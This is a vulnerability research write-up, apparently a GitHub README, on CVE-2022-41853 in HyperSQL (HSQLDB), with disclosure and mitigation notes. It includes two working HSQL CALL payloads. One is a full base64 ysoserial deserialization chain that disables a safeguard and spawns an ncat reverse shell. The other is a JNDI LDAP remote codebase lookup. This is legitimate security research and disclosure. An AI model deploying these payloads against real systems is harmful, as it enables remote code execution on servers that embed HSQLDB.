# Research into CVE-2022-41853: Using static functions to obtian RCE via Java Deserialization & Remote Codebase Attack

Those using java.sql.Statement or java.sql.PreparedStatement in hsqldb (HyperSQL DataBase) to process untrusted input may be vulnerable to a remote code execution attack. By default it is allowed to call any static method of any Java class in the classpath resulting in code execution. The issue can be prevented by updating to 2.7.1 or by setting the system property "hsqldb.method_class_names" to classes which are allowed to be called. For example, System.setProperty("hsqldb.method_class_names", "abc") or Java argument -Dhsqldb.method_class_names="abc" can be used. From version 2.7.1 all classes by default are not accessible except those in java.lang.Math and need to be manually enabled.

### Disclosure:

The initial disclosure for this vulnerability can be found [here](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50212#c7).

### Original Discoverer
OSS-Fuzz team</br>
https://github.com/google/oss-fuzz</br>
</br>

### Proof Of Concept:

Back in 2021, I was reading the blogpost ["Remote Code Execution in F5 Big‑IP" by Mikhail Klyuchnikov](https://swarm.ptsecurity.com/rce-in-f5-big-ip/) on how a path normalization attack + HSQL "CALL" queries could be used in order to call arbitrary Java Static methods in order to obtain RCE.

As, at the time, I was reporting and researching vulnerabilities in Apache SOLR, I remembered that their [JDBC Stream example](https://solr.apache.org/guide/8_10/stream-source-reference.html#jdbc-syntax) uses HSQL and got to setting up the testing environment.
<img width="1792" alt="Screenshot 2023-11-24 at 12 51 49" src="https://github.com/mbadanoiu/CVE-2022-41853/assets/18383407/018e78f6-ede8-4795-9a74-9f887e2faf42">

<strong>Note:</strong> Unfortunatly, this vulnerability does not affect default Apache Solr servers as the HSQL JAR needs to be specifically placed in the folder “./server/solr-webapp/webapp/WEB-INF/lib/” in order for the driver to be reachable by the Stream JDBC component.

## RCE via Java Deserialization

Because the RCE in F5 uses the "com.f5.view.web.pagedefinition.shuffler.Scripting.setRequestContext" function located in the "tmui.jar" (a JAR specific to F5 applications), and I wanted to come up with an application independent payload, I got to looking into how I could chain commonly used JARs (e.g. [Apache Commons Collections](https://commons.apache.org/proper/commons-collections/), [Apache Log4J](https://logging.apache.org/log4j/2.x/)) in order to call static functions and obtain RCE.

As the CommonsCollections* gadgets from [ysoserial](https://github.com/frohoff/ysoserial) were the first thing to come to mind, I went down the route of Java Deserialization with the following results:
- Call ```java.lang.System.setProperty('org.apache.commons.collections.enableUnsafeSerialization','true')``` in order to enable unsafe deserialization (Why bypass when you can remove a safeguard entirely :)) )
- Use the ```public static <T> T org.apache.commons.lang.SerializationUtils.deserialize(byte[] objectData)``` as a sink for our input to reach the ```ObjectInputStream(x).readObject()``` function
- Use functions ```public static byte[] org.apache.logging.log4j.core.config.plugins.convert.parseBase64Binary​(String encoded)``` or ```public static byte[] org.apache.logging.log4j.core.config.plugins.convert.parseHexBinary​(String s)``` in order to turn our encoded ysoserial payload String into a byte array that will be ingested by ```deserialize(byte[] objectData)```

The full HSQL payload has the following form:
```
CALL "java.lang.System.setProperty"('org.apache.commons.collections.enableUnsafeSerialization','true') + "org.apache.commons.lang.SerializationUtils.deserialize"("org.apache.logging.log4j.core.config.plugins.convert.Base64Converter.parseBase64Binary"('rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABxuY2F0IC1lIC9iaW4vYmFzaCAxMjcuMSA0NDQ0dAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg='))
```

<strong>Note:</strong> In this case the ysoserial payload is of type CommonsCollection6 and will execute the ```ncat -e /bin/bash 127.1 4444``` reverse shell command.

<strong>Note 2:</strong> The standalone HSQLDB.jar is not vulnerable to this payload as it does not include the Apache Commons Collections JAR. This vulnerability works (most of the time) when HSQL is included in a web application (e.g. SOLR, Liferay, etc.)

More details and the exploitation process can be found in this [PDF](https://github.com/mbadanoiu/CVE-2022-41853/blob/main/Research%20HSQL%20%2B%20Apache%20SOLR%20-%20CVE-2022-41853.pdf).


## RCE via Remote Codebase Attack over LDAP or RMI

Reading up on this subject in 2023, I stumbled accross this awesome presentation [Exploring JNDI Attacks by iSafeBlue](https://github.com/iSafeBlue/presentation-slides/blob/main/BCS2022-%E6%8E%A2%E7%B4%A2JNDI%E6%94%BB%E5%87%BB.pdf) that used ```java.lang.System.setProperty``` to set ```com.sun.jndi.ldap.object.trustURLCodebase``` or ```com.sun.jndi.rmi.object.trustURLCodebase``` to true and then perform a LDAP/RMI lookup in order to successfully perform a Java Remote Codebase attack.

Example HSQL Payload:
```
CALL java.lang.System.setProperty"('com.sun.jndi.ldap.object.trustURLCodebase','true') + "javax.naming.InitialContext.doLookup"('ldap://127.0.0.1:4444/pgesux')
```

Result:
<img width="1162" alt="Screenshot 2023-11-24 at 13 28 00" src="https://github.com/mbadanoiu/CVE-2022-41853/assets/18383407/9d29f97d-f0cf-4fae-a861-4b9da0766201">

<strong>Note:</strong> Due to unknown reasons this vulnerablity works on the default HSQLDB.jar, but it doesn't work in the HSQL + Apache SOLR environment ¯\\\_(ツ)\_/¯.
